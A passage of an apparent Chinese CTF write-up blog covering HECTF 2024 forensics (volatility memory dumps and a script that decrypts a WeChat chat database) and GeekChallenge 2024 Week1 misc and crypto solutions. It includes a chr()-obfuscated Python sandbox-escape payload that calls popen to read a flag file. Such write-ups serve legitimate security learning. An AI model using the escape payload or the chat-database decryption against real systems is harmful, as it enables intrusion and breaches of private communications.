--xlog_path=&quot;C:\Users\aja\AppData\Roaming\Tencent\WeChat\log\player&quot; --xlog_prefix=player --mojo-platform-channel-handle=3152</span><br></pre></td></tr></table></figure><p>搜索：</p><p><code>volatility -f image.vmem --profile=Win7SP1x64 filescan | findstr &quot;Desktop&quot;</code></p><p>有文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x000000007e1b7660      5      0 RW---- \Device\HarddiskVolume2\Users\aja\Desktop\secretkey.zip</span><br></pre></td></tr></table></figure><p>提取出来：</p><p><code>volatility -f image.vmem --profile=Win7SP1x64 dumpfiles -D ./ -Q 0x000000007e1b7660 -n</code></p><p>得到 <code>secretkey.zip</code>，内有64个含md5值的文件。</p><p>结合题目，寻找微信的聊天记录数据库，参考：<a href="https://gitcode.csdn.net/65e95e561a836825ed790ca3.html">微信PC端数据库文件解密</a></p><blockquote><p>主要讨论的数据库文件，存放于WeChat Files/wxid_xxxxx/Msg之中</p></blockquote><p>搜索：</p><p><code>volatility -f image.vmem --profile=Win7SP1x64 filescan | findstr &quot;Msg&quot;</code></p><p>有文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x000000007da66710      2      1 RW-rw- \Device\HarddiskVolume2\Users\aja\Documents\WeChat Files\wxid_ah0tuevc7rbz22\Msg\Multi\MSG0.db</span><br><span class="line">0x000000007dc9eac0      9      0 R--r-d \Device\HarddiskVolume2\Users\aja\Documents\WeChat Files\wxid_ah0tuevc7rbz22\Msg\Multi\MSG0.db</span><br></pre></td></tr></table></figure><p>提取出来：</p><p><code>volatility -f image.vmem --profile=Win7SP1x64 dumpfiles -D ./ -Q 0x000000007da66710 -n</code></p><p>得到 <code>MSG0.db</code>。</p><p>参考：<a href="https://www.cnblogs.com/Jinx8823/p/16650434.html">2022巅峰极客 - easy_Forensic</a></p><blockquote><p>因为微信数据库是用256位的AES-CBC加密的，它的密钥是32位的，而gift文件里的编码进行解码后也是32位的,所以猜测这是一个被加密的数据库。</p></blockquote><p><code>secretkey.zip</code>内64个含md5值的文件，刚好对应64个16进制数，即32个字符。</p><p>参考脚本解密：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> hashlib, hmac, ctypes</span><br><span class="line"> </span><br><span class="line">SQLITE_FILE_HEADER = <span class="built_in">bytes</span>(<span class="string">&quot;SQLite format 3&quot;</span>,encoding=<span class="string">&#x27;ASCII&#x27;</span>) + <span class="built_in">bytes</span>(<span class="number">1</span>)<span class="comment">#文件头</span></span><br><span class="line">IV_SIZE = <span class="number">16</span></span><br><span class="line">HMAC_SHA1_SIZE = <span class="number">20</span></span><br><span class="line">KEY_SIZE = <span class="number">32</span></span><br><span class="line">DEFAULT_PAGESIZE = <span class="number">4096</span> <span class="comment">#4048数据 + 16IV + 20 HMAC + 12</span></span><br><span class="line">DEFAULT_ITER = <span class="number">64000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#yourkey</span></span><br><span class="line">dic = <span class="string">&#x27;0123456789abcdef&#x27;</span></span><br><span class="line">p = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">f&#x27;secretkey/<span class="subst">&#123;i&#125;</span>&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="keyword">if</span> hashlib.md5(k.encode()).hexdigest() == f:</span><br><span class="line">            p += k</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line">password = <span class="built_in">bytes</span>.fromhex(p)</span><br><span class="line"><span class="built_in">print</span>(password)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&#x27;MSG0.db&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    blist = f.read()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(blist))</span><br><span class="line"> </span><br><span class="line">salt = blist[:<span class="number">16</span>]<span class="comment">#微信将文件头换成了盐</span></span><br><span class="line">key = hashlib.pbkdf2_hmac(<span class="string">&#x27;sha1&#x27;</span>, password, salt, DEFAULT_ITER, KEY_SIZE)<span class="comment">#获得Key</span></span><br><span class="line"> </span><br><span class="line">first = blist[<span class="number">16</span>:DEFAULT_PAGESIZE]<span class="comment">#丢掉salt</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># import struct</span></span><br><span class="line">mac_salt = <span class="built_in">bytes</span>([x^<span class="number">0x3a</span> <span class="keyword">for</span> x <span class="keyword">in</span> salt])</span><br><span class="line">mac_key = hashlib.pbkdf2_hmac(<span class="string">&#x27;sha1&#x27;</span>, key, mac_salt, <span class="number">2</span>, KEY_SIZE)</span><br><span class="line"> </span><br><span class="line">hash_mac = hmac.new(mac_key ,digestmod = <span class="string">&#x27;sha1&#x27;</span>)<span class="comment">#用第一页的Hash测试一下</span></span><br><span class="line">hash_mac.update(first[:-<span class="number">32</span>])</span><br><span class="line">hash_mac.update(<span class="built_in">bytes</span>(ctypes.c_int(<span class="number">1</span>)))</span><br><span class="line"><span class="comment"># hash_mac.update(struct.pack(&#x27;=I&#x27;,1))</span></span><br><span class="line"><span class="keyword">if</span> (hash_mac.digest() == first[-<span class="number">32</span>:-<span class="number">12</span>]):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Correct Password&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;Wrong Password&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">blist = [blist[i:i+DEFAULT_PAGESIZE] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(DEFAULT_PAGESIZE,<span class="built_in">len</span>(blist),DEFAULT_PAGESIZE)]</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&#x27;out.db&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(SQLITE_FILE_HEADER)<span class="comment">#写入文件头</span></span><br><span class="line">    t = AES.new(key ,AES.MODE_CBC ,first[-<span class="number">48</span>:-<span class="number">32</span>])</span><br><span class="line">    f.write(t.decrypt(first[:-<span class="number">48</span>]))</span><br><span class="line">    f.write(first[-<span class="number">48</span>:])</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> blist:</span><br><span class="line">            t = AES.new(key ,AES.MODE_CBC ,i[-<span class="number">48</span>:-<span class="number">32</span>])</span><br><span class="line">            f.write(t.decrypt(i[:-<span class="number">48</span>]))</span><br><span class="line">            f.write(i[-<span class="number">48</span>:])</span><br></pre></td></tr></table></figure><p>用SQLiteSpy打开 <code>out.db</code>，在MSG表里面：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">通过网盘分享的文件：secret_.zip</span><br><span class="line">链接: https://pan.baidu.com/s/17Bt-vSpRpBLRuhTWaCgb6g?pwd=mfpt 提取码: mfpt </span><br><span class="line">--来自百度网盘超级会员v4的分享</span><br></pre></td></tr></table></figure><p>取出 <code>data_and_key.txt</code>，有data和key，尝试AES、veracrypt、RC4，在RC4情况下解出jpg。</p><p>jpg末尾有zip，最后有提示：<code>`hectf_[4number].zip</code>，掩码爆破得到密码 <code>hectf_7865</code>，解压zip压缩包得到flag：<code>HECTF&#123;Ez_WeCh@t_da7b45ef2e2b948dd22f4366fb536a46_S3cRet&#125;</code>。</p><p>​    </p><h3 id="Rem-You"><a href="#Rem-You" class="headerlink" title="Rem_You"></a>Rem_You</h3><p><code>Rem_YOU.png</code>，16进制查看，实际是jpg。</p><p>提取末尾的zip压缩包，解压，jigsaw文件夹有9个二维码碎片，拼接，扫描得到：</p><p><code>JBCUGVCGPN2VMM3YPBRTOUZYNF4UETSUPB2GM6DWKBZE6N2SIZCTGZ2MOBZG6OLBGNAVOMSLKB6Q====</code></p><p>base32解码得flag：<code>HECTF&#123;uV3xxc7S8iyBNTxtfxvPrO7RFE3gLpro9a3AW2KP&#125;</code>。</p><p>​    </p><h3 id="快来反馈吧！！"><a href="#快来反馈吧！！" class="headerlink" title="快来反馈吧！！"></a>快来反馈吧！！</h3><blockquote><p>什么？！听说反馈就可以有flag？！！！！ <a href="https://www.wjx.cn/vm/wDLL4tY.aspx#">https://www.wjx.cn/vm/wDLL4tY.aspx#</a> </p></blockquote><p>填问卷得flag：<code>HECTF&#123;5L+d5L+d5ZCM5L2V5biI5Lq65Lus55qE5Y+C5LiO_ThankYouMasters&#125;</code>。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;河北师范大学信息安全挑战赛是由河北师范大学SourceCode战队组织的面向全国大学生的CTF竞技活动。自HECTF举办至今，每届大赛都会吸引来自全国400多支队伍和校内大量的学生报名参加比赛。 2024HECTF挑战赛是我们举办的第八届赛事，由河</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2024赛" scheme="https://lazzzaro.github.io/tags/2024%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>GeekChallenge2024 第十五届极客大挑战</title>
    <link href="https://lazzzaro.github.io/2024/11/06/match-GeekChallenge2024-%E7%AC%AC%E5%8D%81%E4%BA%94%E5%B1%8A%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/"/>
    <id>https://lazzzaro.github.io/2024/11/06/match-GeekChallenge2024-%E7%AC%AC%E5%8D%81%E4%BA%94%E5%B1%8A%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/</id>
    <published>2024-11-06T13:31:12.000Z</published>
    <updated>2024-11-19T10:26:37.494Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><p>三叶草安全技术小组第十五届极客大挑战</p><p>极客大挑战是由三叶草安全技术小组自发组织举办的一场全国性网络安全赛事，目前，极客大挑战已成功举办十四届，吸引了超两万五千人次参加，累计提供超1000道赛题，广受全国各地参赛人员好评。作为国内最早一批举办的新生赛，极客大挑战一直以加强行业交流和提供优质学习平台为初心，为广大高校的信息安全学子提供了一个便捷的网络安全实战入门途径。</p><p>线上竞赛      10月18日20:00-11月18日20:00 </p><p><strong>Rank: 1</strong></p><hr><h1 id="Week1"><a href="#Week1" class="headerlink" title="Week1"></a>Week1</h1><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="2024-geek-challenge-签到"><a href="#2024-geek-challenge-签到" class="headerlink" title="2024 geek challenge!签到"></a>2024 geek challenge!签到</h3><blockquote><p>关注小组公众号三叶草小组Syclover,回复关键词 “2024 geek challenge!签到” 进行签到</p></blockquote><p>公众号发关键词，flag：<code>SYC&#123;weLc0mE-tO-2_o_2_100-GeeK@cha11Enge!!&#125;</code>。</p><p>​    </p><h3 id="ez-jpg"><a href="#ez-jpg" class="headerlink" title="ez_jpg"></a>ez_jpg</h3><blockquote><p>点击就送</p></blockquote><p>base64+reverse+hex，改宽从528到628，图片里得到flag：<code>SYC&#123;Steg_4nd_Zip_1s_G00d!&#125;</code>。</p><p>​    </p><h3 id="Truth-of-Word"><a href="#Truth-of-Word" class="headerlink" title="Truth of Word"></a>Truth of Word</h3><blockquote><p>Word文件真正的奥妙</p></blockquote><p>第一处：</p><p>打开docx文件，修改文字颜色，flag1：<code>Flag01=SYC&#123;W0rd_H@5</code>。</p><p>第二处：</p><p>提取宏代码：<code>olevba vbaProject.bin</code>，得到：</p><figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Sub</span> Flag02()</span><br><span class="line"><span class="comment">&#x27;</span></span><br><span class="line"><span class="comment">&#x27; Flag02 宏</span></span><br><span class="line"><span class="comment">&#x27;Flag = @_Ama1n9_</span></span><br><span class="line"><span class="comment">&#x27;</span></span><br></pre></td></tr></table></figure><p>第三处：</p><p>以压缩包形式打开docx，<code>word/media</code> 下有 <code>flag03.png</code>，flag3：<code>FLAG03=StrUCtu3e!&#125;</code>。</p><p>flag：<code>SYC&#123;W0rd_H@5@_Ama1n9_StrUCtu3e!&#125;</code>。</p><p>​    </p><h3 id="Welcome-jail"><a href="#Welcome-jail" class="headerlink" title="Welcome_jail"></a>Welcome_jail</h3><blockquote><p>就是一个简单的pyjail啦</p></blockquote><p>用 <code>chr()</code> 函数连接拼凑字符串：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">d</span>(<span class="params">x</span>):</span><br><span class="line">    t=[]</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> x:</span><br><span class="line">        t.append(<span class="string">f&#x27;chr(<span class="subst">&#123;<span class="built_in">ord</span>(k)&#125;</span>)&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;+&#x27;</span>.join(t)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(d(<span class="string">&#x27;cat /home/ctf/flag&#x27;</span>))</span><br></pre></td></tr></table></figure><p>payload：</p><p><code>print(&#123;&#125;.__class__.__mro__[1].__subclasses__()[-4].__init__.__globals__[chr(112)+chr(111)+chr(112)+chr(101)+chr(110)](chr(99)+chr(97)+chr(116)+chr(32)+chr(47)+chr(104)+chr(111)+chr(109)+chr(101)+chr(47)+chr(99)+chr(116)+chr(102)+chr(47)+chr(102)+chr(108)+chr(97)+chr(103)).read())</code></p><p>​    </p><h3 id="雪"><a href="#雪" class="headerlink" title="雪"></a>雪</h3><blockquote><p>又到了白色相簿的季节</p></blockquote><p>zip末尾 <code>VzNMQzBNNA==</code>，base64解码得：<code>W3LC0M4</code>。</p><p><code>syclover_WaterMark.png</code> 盲水印提取得：<code>Th1si4st8eK3y</code>，<code>white.txt</code> 再snow解密：</p><p><code>stegsnow -C -p Th1si4st8eK3y white.txt</code></p><p>得flag：<code>SYC&#123;Ma1by_y0u_w1ll_l1k3_sn0w&#125;</code>。</p><p>​    </p><h3 id="I-wanna-go-to-SYC"><a href="#I-wanna-go-to-SYC" class="headerlink" title="I_wanna_go_to_SYC"></a>I_wanna_go_to_SYC</h3><blockquote><p>BoBo人觉得iwanna很好玩，但是他打不过去能帮帮它吗？ 题目附件下载链接<a href="https://pan.baidu.com/s/1JCqJ8TkXBYJjPUVJbHMlvg">https://pan.baidu.com/s/1JCqJ8TkXBYJjPUVJbHMlvg</a> 密码:game</p></blockquote><p>gm8decompiler转exe为gmk，再用gamemaker打开。</p><p>在 <code>Rooms-sycroom</code> 发现flag：<code>SYC&#123;NO_PRObLEM_yOU_DO_It_G1Me_LOVER&#125;</code>。</p><p>​    </p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="凯撒加密"><a href="#凯撒加密" class="headerlink" title="凯撒加密"></a>凯撒加密</h3><blockquote><p>凯撒你了解吗？flag前缀为SYC{xx}</p></blockquote><p><code>YEI&#123;CKRIUSK_ZU_2024_MKKQ_INGRRKTMK&#125;</code></p><p>ROT20得到：<code>SYC&#123;WELCOME_TO_2024_GEEK_CHALLENGE&#125;</code></p><p>​    </p><h3 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h3><blockquote><p>基础RSA，flag前缀为SYC{xx}</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">33108009203593648507706487693709965711774665216872550007309537128959455938833</span></span><br><span class="line">p = <span class="number">192173332221883349384646293941837353967</span></span><br><span class="line">q = <span class="number">172282016556631997385463935089230918399</span></span><br><span class="line">c = <span class="number">5366332878961364744687912786162467698377615956518615197391990327680664213847</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">f =(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d=inverse_mod(e,f)</span><br><span class="line">m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># SYC&#123;RSA_is_easy&#125;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="X0R"><a href="#X0R" class="headerlink" title="X0R"></a>X0R</h3><blockquote><p>xor和^有什么区别呢，flag前缀为SYC{</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">f1 = <span class="number">4585958212176920650644941909171976689111990</span></span><br><span class="line">f2 = <span class="number">3062959364761961602614252587049328627114908</span></span><br><span class="line">e2 = <span class="number">10706859949950921239354880312196039515724907</span></span><br><span class="line">e1 = f2^e2</span><br><span class="line">enc = e1^f1</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(enc))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;mes)_c@3LHobXchblA&#x27;</span></span><br></pre></td></tr></table></figure><p>根据flag头 <code>SYC&#123;</code>，异或得到key是 <code>&gt;&lt;0R</code>，异或 <code>&gt;&lt;0R</code> 得到 <code>SYC&#123;a_part_0f_X0R&#125;</code>。</p><p>​    </p><h3 id="dp"><a href="#dp" class="headerlink" title="dp"></a>dp</h3><blockquote><p>dp泄露，flag前缀为SYC{xx}</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2 <span class="keyword">as</span> gp</span><br><span class="line"></span><br><span class="line">c =  <span class="number">127916287434936224964530288403657504450134210781148845328357237956681373722556447001247137686758965891751380034827824922625307521221598031789165449134994998397717982461775225812413476283147124013667777578827293691666320739053915493782515447112364470583788127477537555786778672970196314874316507098162498135060</span></span><br><span class="line">n =  <span class="number">157667866005866043809675592336288962106125998780791920007920833145068421861029354497045918471672956655205541928071253023208751202980457919399456984628429198438149779785543371372206661553180051432786094530268099696823142821724314197245158942206348670703497441629288741715352106143317909146546420870645633338871</span></span><br><span class="line">e =  <span class="number">65537</span></span><br><span class="line">dp =  <span class="number">2509050304161548479367108202753097217949816106531036020623500808413533337006939302155166063392071003278307018323129989037561756887882853296553118973548769</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, e):</span><br><span class="line"><span class="keyword">if</span>(e*dp%x==<span class="number">1</span>):</span><br><span class="line">p=(e*dp-<span class="number">1</span>)//x+<span class="number">1</span></span><br><span class="line"><span class="keyword">if</span>(n%p!=<span class="number">0</span>):</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">q=n//p</span><br><span class="line">phin=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d=gp.invert(e, phin)</span><br><span class="line">m=gp.powmod(c, d, n)</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">len</span>(<span class="built_in">hex</span>(m)[<span class="number">2</span>:])%<span class="number">2</span>==<span class="number">1</span>):</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;--------------&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(m)[<span class="number">2</span>:])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;welcome_to_crypto&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="共模攻击"><a href="#共模攻击" class="headerlink" title="共模攻击"></a>共模攻击</h3><blockquote><p>共模攻击，flag前缀为SYC{xx}</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2 <span class="keyword">as</span> gp</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">egcd</span>(<span class="params">a, b</span>):</span><br><span class="line"><span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">g, y, x = egcd(b % a, a)</span><br><span class="line"><span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"></span><br><span class="line">n = <span class="number">19742875423645690846073637620470497648804310111201409901059297083827103813674034450200432098143959078292346910591785265323563248781526393718834491458926162514713269984791730816121181307827624489725923763353393879316510062227511469438742429290073999388690825732236465647396755899136346150862848924231619666069528077790933176798057396704758072769660663756346237040909579775389576227450505746914753205890194457812893098491264392293949768193694560954874603451253079446652049592976605414438411872223250039782381259212718733455588477129910357095186014496957765297934289263536712574572533650393220492870445376144568199077767</span></span><br><span class="line">e1 = <span class="number">911</span></span><br><span class="line">e2 = <span class="number">967</span></span><br><span class="line">c1 = <span class="number">18676091924461946809127036439355116782539894105245796626898495935702348484076501694838877829307466429933623102626122909782775514926293363853121828819237500456062111805212209491398720528499589486241208820804465599279152640624618194425740368495072591471531868392274503936869225072123214869399971636428177516761675388589238329574042518038702529606188240859751459632643230538522947412931990009143731829484941397093509641320264169403755707495153433568106934850283614529793695266717330769019091782929139589939928210818515744604847453929432990185347112319971445630830477574679898503825626294542336195240055995445217249602983</span></span><br><span class="line">c2 = <span class="number">4229417863231092939788858229435938841085459330992709019823280977891432565586698228613770964563920779991584732527715378842621171338649745186081520176123907689669636473919678398014317024138622949923292787095400632018991311254591786179660603414693984024161009444842277220189315861986306573182865656366278782315864366857374874763243428496061153290565891942968876789905670073321426112497113145141539289020571684634406829272902118484670099097148727072718299512735637087933649345419433312872607209633402427461708181971718804026293074540519907755129917132236240606834816534369171888633588190859475764799895410284484045429152</span> </span><br><span class="line">s = egcd(e1, e2)</span><br><span class="line">s1 = s[<span class="number">1</span>]</span><br><span class="line">s2 = s[<span class="number">2</span>]</span><br><span class="line"><span class="keyword">if</span> s1&lt;<span class="number">0</span>:</span><br><span class="line">s1 = - s1</span><br><span class="line">c1 = gp.invert(c1, n)</span><br><span class="line"><span class="keyword">elif</span> s2&lt;<span class="number">0</span>:</span><br><span class="line">s2 = - s2</span><br><span class="line">c2 = gp.invert(c2, n)</span><br><span class="line"></span><br><span class="line">m = <span class="built_in">pow</span>(c1,s1,n)*<span class="built_in">pow</span>(c2,s2,n) % n</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(m)[<span class="number">2</span>:])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># SYC&#123;U_can_really_attack&#125;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="不是套娃"><a href="#不是套娃" class="headerlink" title="不是套娃"></a>不是套娃</h3><blockquote><p>一位旅行者兜兜转转，终能抵达终点——可能要多转几个弯，走错几块地 题目附件 <a href="https://pan.baidu.com/s/1YQuXvK7wNrhLoCUcmWEMZw">https://pan.baidu.com/s/1YQuXvK7wNrhLoCUcmWEMZw</a> 提取码：game</p></blockquote><p>第一层：</p><p><code>-..-/../-./..--.-/.---/../..--.-/--../../..--.-/.--/.-/..--.-/-.--/../..--.-/--../../..--.-/--/---/..--.-/-.--/../..--.-/-../..-/.-/..--.-/--../..</code></p><p>摩斯密码：<code>xin_ji_zi_wa_yi_zi_mo_yi_dua_zi</code></p><p>第二层：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">key &lt;- commander</span><br><span class="line"></span><br><span class="line">KEY = uizrlbzii</span><br><span class="line"></span><br><span class="line">+        +        +        +        +        +        +        +        +        +</span><br><span class="line">uizrlbzii Rsm    o                       o                       o  Bcynirv</span><br><span class="line">+        +        +        +        +        +        +        +        +        +</span><br><span class="line">uizrlbzii</span><br><span class="line">+        +        +        +        +        +        +        +        +        +</span><br><span class="line">uizrlbzii Rsm</span><br><span class="line">+        +        +        +        +        +        +        +        +        +</span><br><span class="line">uizrlbzii Rsm</span><br><span class="line">+        +        +        +        +        +        +        +        +        +</span><br><span class="line">uizrlbzii</span><br><span class="line">+        +        +        +        +        +        +        +        +        +</span><br><span class="line">uizrlbzii Rsm             o                       o  Yoxx-nhw        o Bcynirv</span><br><span class="line">+        +        +        +        +        +        +        +        +        +</span><br></pre></td></tr></table></figure><p>可知 <code>uizrlbzii</code> 对应的是 <code>commander</code>，维吉尼亚密码解出key是 <code>sunflower</code>。</p><p>第三层：</p><p><code>a1fdbce928af7aae</code>，cmd5查询得到 <code>HaiKav</code>。</p><p>第四层：</p><p><code>NEFICPIC&amp;CRTCTNEYO</code>，栅栏密码key=3，得到 <code>NICECTF&amp;NICECRYPTO</code>。</p><p>第五层：</p><p><code>tip: 100 -&gt; 13 -&gt; 64 -&gt; 65536</code> ，按照提示，base100+rot13+base64+base65536，得到 <code>原神，启动！</code>。</p><p>得到flag：<code>SYC&#123;H0W_P3RF3C+_YU0_AR3!&#125;</code>。</p><p>​    </p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="100-的⚪"><a href="#100-的⚪" class="headerlink" title="100%的⚪"></a>100%的⚪</h3><blockquote><p>⚪神启动</p></blockquote><p>circle.html查看源代码中js代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (score == <span class="number">100</span>) 